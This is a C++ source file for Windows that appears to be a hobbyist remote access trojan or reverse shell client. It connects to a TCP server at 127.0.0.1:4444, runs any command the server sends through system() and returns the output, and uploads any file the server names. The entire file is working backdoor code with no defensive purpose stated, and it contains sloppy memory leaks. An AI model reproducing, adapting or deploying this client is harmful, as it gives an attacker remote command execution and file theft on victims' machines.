
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <fstream>


#pragma comment(lib, "ws2_32.lib")


using namespace std;
string execute(const string& command) {
    system((command + ">temp.txt").c_str());
    ifstream ifs("temp.txt");
    string ret{ istreambuf_iterator<char>(ifs), istreambuf_iterator<char>() };
    ifs.close();
    if (remove("temp.txt") != 0){
        cout << "data couldnt be deleted uh oh";
    }
    return ret;
}


int main()
{
    string ipAdress = "127.0.0.1"; //local IP adress
    int port = 4444; //port used by our TCP server

    //Activates Winsock

    WSAData data;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    if (wsResult != 0) {
        cout << "something went really bad, exiting programm";
        return 0;
    }

    //creates socket

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); //little notice here => AF_INET stands for IPv4 and SOCK_STREAM for the TCP_Product
    if (sock == INVALID_SOCKET) {
        cout << "socket could not be created, exiting";
        WSACleanup();
        return 0;                                 //ends opertation if socket creation has failed

    }

    //Fill in hint structure
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAdress.c_str(), &hint.sin_addr);

    //connect the server


    int connectResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if (connectResult == SOCKET_ERROR)
    {
        cout << "Connection to server could not be created";
        closesocket(sock);
        return 0;                           //closes down if the connection the server could not be created
    }

    //loop where data gets retrieved

    char buf[4096];
    while (true) {

        ZeroMemory(buf, 4096);
        int bytesReceived = recv(sock, buf, 4096, 0);
        if (bytesReceived > 0) {

            string message = string(buf, 0, bytesReceived);

            string delimiter = " ";
            size_t pos = 0;
            string* command = new string[2048];

            pos = message.find(delimiter);
            command[0] = message.substr(0, pos);
            message.erase(0, pos + delimiter.length());
            command[1] = message;

            cout << command[1] << endl;
            //server processes the message

            if (command[0] == "cmd") {
                string rply = execute(command[1]);
                send(sock, rply.c_str(), rply.size() + 1,0);

            }
            if (command[0] == "sendfile") {
                string filesend = "filesend";
                send(sock, filesend.c_str(), filesend.size(), 0);
                string path = command[1];

                size_t found = path.find_last_of("\\");
                string filename = path.substr(found + 1);
                ifstream getsize(path, ios::binary | ios::ate);
                string sizefile = to_string(getsize.tellg());
                sizefile += ":";
                sizefile += filename;

                send(sock, sizefile.c_str(), sizefile.size(), 0);
                ZeroMemory(buf, 4096);
                recv(sock, buf, 4096, 0);
                size_t buffer_size = 4096;
                char* buffer = new char[buffer_size];

                ifstream fin(path, ios::binary);
                while (fin)
                {
                    fin.read(buffer, buffer_size);
                    size_t count = fin.gcount();
                    send(sock, buffer, count, 0);
                    ZeroMemory(buf, 4096);
                    recv(sock, buf, 4096, 0);
                    if (!count)
                        break;
                }

                cout <<"Data has been sucessfully tranfered";
                string finish = "xdd";
                send(sock,finish.c_str(), finish.size(), 0);
            }
        }


    }




}

